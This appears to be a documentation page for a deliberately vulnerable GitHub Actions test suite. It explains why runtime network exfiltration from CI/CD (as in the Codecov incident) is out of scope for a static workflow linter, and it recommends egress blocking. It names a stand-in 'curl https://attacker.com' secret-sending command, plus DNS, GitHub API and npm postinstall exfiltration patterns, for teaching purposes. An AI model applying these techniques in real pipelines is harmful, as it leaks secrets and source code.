+++
title = 'Case 12: Network Exfiltration (Runtime)'
date = 2026-03-14T00:00:00+09:00
draft = false
weight = 12
+++

# Case 12: Network Exfiltration (Runtime)

## Target Files

- `anomalous-outbound-calls.yaml` → [`script/actions/goat-anomalous-outbound-calls.yaml`](../../script/actions/goat-anomalous-outbound-calls.yaml)
- `unexpected-outbound-calls.yml` → [`script/actions/goat-unexpected-outbound-calls.yml`](../../script/actions/goat-unexpected-outbound-calls.yml)
- `hosted-network-without-hr.yml` → [`script/actions/goat-hosted-network-without-hr.yml`](../../script/actions/goat-hosted-network-without-hr.yml)
- `hosted-network-monitoring-hr.yml` → [`script/actions/goat-hosted-network-monitoring-hr.yml`](../../script/actions/goat-hosted-network-monitoring-hr.yml)
- `hosted-network-filtering-hr.yml` (secure) → [`script/actions/goat-hosted-network-filtering-hr.yml`](../../script/actions/goat-hosted-network-filtering-hr.yml)
- `hosted-https-monitoring-hr.yml` → [`script/actions/goat-hosted-https-monitoring-hr.yml`](../../script/actions/goat-hosted-https-monitoring-hr.yml)
- `self-hosted-network-monitoring-hr.yml` → [`script/actions/goat-self-hosted-network-monitoring-hr.yml`](../../script/actions/goat-self-hosted-network-monitoring-hr.yml)
- `self-hosted-network-filtering-hr.yml` (secure) → [`script/actions/goat-self-hosted-network-filtering-hr.yml`](../../script/actions/goat-self-hosted-network-filtering-hr.yml)
- `arc-codecov-simulation.yml` → [`script/actions/goat-arc-codecov-simulation.yml`](../../script/actions/goat-arc-codecov-simulation.yml)
- `arc-secure-by-default.yml` → [`script/actions/goat-arc-secure-by-default.yml`](../../script/actions/goat-arc-secure-by-default.yml)
- `arc-zero-effort-observability.yml` → [`script/actions/goat-arc-zero-effort-observability.yml`](../../script/actions/goat-arc-zero-effort-observability.yml)
- `block-dns-exfiltration.yaml` → [`script/actions/goat-block-dns-exfiltration.yaml`](../../script/actions/goat-block-dns-exfiltration.yaml)
- `publish.yml` → [`script/actions/goat-publish.yml`](../../script/actions/goat-publish.yml)

## Vulnerability Overview

Compromised npm packages or build tools exfiltrate secrets and source code to external servers during CI/CD execution. This reproduces real-world incidents like Codecov and SolarWinds.

### Attack Patterns

1. **HTTP exfiltration**: `curl https://attacker.com` to send secrets
2. **DNS exfiltration**: Encoding secrets as subdomains in DNS queries
3. **HTTPS via GitHub API**: Using legitimate GitHub API to send secrets to another repository
4. **npm package**: Malicious `postinstall` script with covert communication

## Why Out of Scope

Network exfiltration is a runtime problem that static analysis cannot detect:

1. Malicious network calls originate from npm `postinstall` scripts, not from the workflow YAML
2. DNS exfiltration cannot be identified by analyzing `dig` command arguments alone
3. Legitimate and malicious API calls are statically indistinguishable

### Indirect Mitigation by sisakulint

- `commit-sha`: Pinning actions reduces compromise risk
- `permissions`: Least privilege limits secrets access
- `secret-exfiltration`: Direct network commands in workflow YAML are detected

## Recommended Defense

- **harden-runner** with `egress-policy: block` for network filtering
- Allowlist-based egress control

## Verdict: OUT OF SCOPE (Runtime Security)
